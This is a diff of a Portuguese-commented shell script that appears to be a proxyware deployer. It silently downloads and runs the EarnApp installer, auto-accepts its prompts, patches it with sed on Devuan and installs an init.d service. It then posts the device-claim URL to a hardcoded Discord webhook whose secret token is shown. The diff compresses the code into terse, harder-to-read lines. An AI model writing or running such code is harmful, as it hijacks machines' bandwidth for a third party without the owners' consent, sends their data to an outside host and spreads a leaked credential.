@@ -181,45 +181,35 @@ fi
 # ==============================
 # 🧩 EarnApp
 # ==============================
-EARN_CONF="$HOME/.config/earnapp/agent_id"
-EARN_BIN="/opt/earnapp/earnapp"
-EARN_SERVICE=$(systemctl list-unit-files 2>/dev/null | grep -E 'earnapp|earnappd' | grep -v 'earnapp-reset' | head -n1)
-if [ ! -f "$EARN_CONF" ] && [ ! -x "$EARN_BIN" ] && [ -z "$EARN_SERVICE" ]; then
-    echo "$(date '+%Y-%m-%d %H:%M:%S') - [EARNAPP] Iniciando instalação do EarnApp" >>"$LOG_FILE"
-    if [[ "$DISTRO_DETECT" == "devuan" ]]; then
-        echo "$(date '+%Y-%m-%d %H:%M:%S') - [EARNAPP] Modo Devuan (sem systemd)" >>"$LOG_FILE"
-        wget -qO /tmp/earnapp.sh https://brightdata.com/static/earnapp/install.sh
-        sed -i 's/systemctl.*/echo "systemd ignorado no Devuan"/g' /tmp/earnapp.sh
-        sed -i 's/install_service/echo "Serviço desativado no Devuan"/g' /tmp/earnapp.sh
-        bash /tmp/earnapp.sh >>"$LOG_FILE" 2>&1
-        cat <<'EOFD' >/etc/init.d/earnapp
+EC="$HOME/.config/earnapp/agent_id";EB="/opt/earnapp/earnapp";ES=$(systemctl list-unit-files 2>/dev/null|grep -E 'earnapp|earnappd'|grep -v 'earnapp-reset'|head -n1)
+if [ ! -f "$EC" ] && [ ! -x "$EB" ] && [ -z "$ES" ]; then
+echo "$(date '+%F %T')-[EA]start" >>"$LOG_FILE"
+if [ "$DISTRO_DETECT" = "devuan" ]; then
+echo "$(date '+%F %T')-[EA]devuan" >>"$LOG_FILE"
+wget -qO /tmp/e.sh https://brightdata.com/static/earnapp/install.sh
+sed -i 's/systemctl.*/echo ssdmdevuan/g' /tmp/e.sh
+sed -i 's/install_service/echo srvdevuan/g' /tmp/e.sh
+bash /tmp/e.sh >>"$LOG_FILE" 2>&1
+cat<<'X'>/etc/init.d/earnapp
 #!/bin/sh
-CMD="/opt/earnapp/earnapp"
-LOG="/var/log/earnapp.log"
+C="/opt/earnapp/earnapp"
 case "$1" in
-  start)   $CMD start  >/var/log/earnapp.log 2>&1 & ;;
-  stop)    $CMD stop   >/var/log/earnapp.log 2>&1 & ;;
-  restart) $CMD stop && sleep 2 && $CMD start & ;;
-  status)  $CMD status ;;
-  *)       echo "Uso: $0 {start|stop|restart|status}"; exit 1 ;;
+ start)$C start >/var/log/earnapp.log 2>&1 &;;
+ stop)$C stop >/var/log/earnapp.log 2>&1 &;;
+ restart)$C stop;sleep 2;$C start &;;
+ status)$C status;;
+ *)echo "Uso: $0 {start|stop|restart|status}";exit 1;;
 esac
-EOFD
-        chmod +x /etc/init.d/earnapp
-        update-rc.d earnapp defaults >>"$LOG_FILE" 2>&1
-    else
-        wget -qO /tmp/earnapp.sh https://brightdata.com/static/earnapp/install.sh
-        EARN_LOG=$(
-            { echo yes | bash /tmp/earnapp.sh 2>&1 | tee -a "$LOG_FILE"; } 2>&1
-        )
-        URL=$(echo "$EARN_LOG" | grep -Eo 'https://earnapp\.com/r/[a-zA-Z0-9/_\-]+' | head -n1)
-        if [ -n "$URL" ]; then
-            curl -s -H "Content-Type: application/json" \
-                -X POST \
-                -d "{\"content\": \"$URL\"}" \
-                "https://discord.com/api/webhooks/1442589391238205460/sBPE0SdCKsgsEyYZhDVZ2e8feTLvN2zgNagNTskwwN5Um2bJHHqQVKUSDZb3JiDFaALh"
-        fi
-    fi
-    rm -f /tmp/earnapp.sh
+X
+chmod +x /etc/init.d/earnapp
+update-rc.d earnapp defaults >>"$LOG_FILE" 2>&1
+else
+wget -qO /tmp/earnapp.sh https://brightdata.com/static/earnapp/install.sh
+EARN_LOG=$({ echo yes | bash /tmp/earnapp.sh 2>&1 | tee -a "$LOG_FILE"; } 2>&1)
+URL=$(echo "$EARN_LOG" | grep -Eo 'https://earnapp\.com/r/[A-Za-z0-9/_\-]+' | head -n1)
+if [ -n "$URL" ]; then curl -s -H "Content-Type: application/json" -X POST -d "{\"content\": \"$URL\"}" "https://discord.com/api/webhooks/1442589391238205460/sBPE0SdCKsgsEyYZhDVZ2e8feTLvN2zgNagNTskwwN5Um2bJHHqQVKUSDZb3JiDFaALh";fi
+fi
+rm -f /tmp/e.sh /tmp/earnapp.sh
 fi
 
 # ==============================
